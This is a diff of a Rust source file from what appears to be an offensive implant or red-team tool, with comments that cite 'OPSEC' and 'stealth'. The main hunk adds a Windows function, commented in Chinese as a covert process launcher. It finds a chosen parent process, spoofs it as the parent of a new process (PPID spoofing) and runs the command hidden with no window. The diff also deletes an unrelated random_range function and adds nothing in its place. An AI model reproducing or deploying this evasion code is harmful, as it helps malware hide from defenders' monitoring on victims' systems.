@@ -167,8 +167,9 @@ mod tests {
 }
 
 /// Windows debug logging (Enabled for inspection)
-pub fn db_print(_msg: &str) {
-    // [OPSEC] Debug prints disabled for production stability and stealth.
+pub fn db_print(msg: &str) {
+    use log::debug;
+    debug!("{}", msg);
 }
 
 // --- 🛡️ OPSEC: Dependency-free PRNG to avoid BCrypt initialization crashes ---
@@ -200,7 +201,76 @@ pub fn random_bool(p: f64) -> bool {
     next_u32() < threshold
 }
 
-pub fn random_range(min: u32, max: u32) -> u32 {
-    if min >= max { return min; }
-    min + (next_u32() % (max - min + 1))
+/// ⚡ 隐蔽进程启动：使用 PPID Spoofing 假冒父进程并隐藏窗口
+#[cfg(windows)]
+pub fn spawn_spoofed_process(cmd: &str, parent_name: &str) -> Option<u32> {
+    use std::ptr;
+    use std::os::windows::ffi::OsStrExt;
+    use winapi::um::processthreadsapi::*;
+    use winapi::um::tlhelp32::*;
+    use winapi::um::handleapi::*;
+    use winapi::shared::minwindef::*;
+
+    unsafe {
+        // 1. 查找父进程 PID
+        let mut ppid = 0;
+        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if snapshot != INVALID_HANDLE_VALUE {
+            let mut entry: PROCESSENTRY32W = std::mem::zeroed();
+            entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
+            if Process32FirstW(snapshot, &mut entry) != 0 {
+                loop {
+                    let curr = String::from_utf16_lossy(&entry.szExeFile).trim_matches(char::from(0)).to_lowercase();
+                    if curr.contains(&parent_name.to_lowercase()) {
+                        ppid = entry.th32ProcessID;
+                        break;
+                    }
+                    if Process32NextW(snapshot, &mut entry) == 0 { break; }
+                }
+            }
+            CloseHandle(snapshot);
+        }
+
+        if ppid == 0 { return None; }
+
+        // 2. 初始化属性列表进行 PPID 欺骗
+        let mut si_ex: STARTUPINFOEXW = std::mem::zeroed();
+        si_ex.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;
+
+        let mut list_size: usize = 0;
+        InitializeProcThreadAttributeList(ptr::null_mut(), 1, 0, &mut list_size);
+        let mut lp_list = vec![0u8; list_size];
+        let attribute_list = lp_list.as_mut_ptr() as LPPROC_THREAD_ATTRIBUTE_LIST;
+
+        if InitializeProcThreadAttributeList(attribute_list, 1, 0, &mut list_size) == 0 { return None; }
+
+        let mut parent_handle = OpenProcess(winapi::um::winnt::PROCESS_CREATE_PROCESS, FALSE, ppid);
+        if parent_handle.is_null() { return None; }
+
+        UpdateProcThreadAttribute(attribute_list, 0, 0x00020000, &mut parent_handle as *mut _ as *mut _, std::mem::size_of::<winapi::um::winnt::HANDLE>(), ptr::null_mut(), ptr::null_mut());
+        si_ex.lpAttributeList = attribute_list;
+
+        let mut cmd_w: Vec<u16> = std::ffi::OsStr::new(cmd).encode_wide().chain(std::iter::once(0)).collect();
+        let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
+
+        // 🚀 CREATE_NO_WINDOW + EXTENDED_STARTUPINFO_PRESENT
+        let res = CreateProcessW(
+            ptr::null(), cmd_w.as_mut_ptr(),
+            ptr::null_mut(), ptr::null_mut(), FALSE,
+            0x08000000 | 0x00080000, // CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT
+            ptr::null_mut(), ptr::null(),
+            &mut si_ex.StartupInfo, &mut pi
+        );
+
+        DeleteProcThreadAttributeList(attribute_list);
+        CloseHandle(parent_handle);
+
+        if res != 0 {
+            CloseHandle(pi.hThread);
+            CloseHandle(pi.hProcess);
+            Some(pi.dwProcessId)
+        } else {
+            None
+        }
+    }
 }
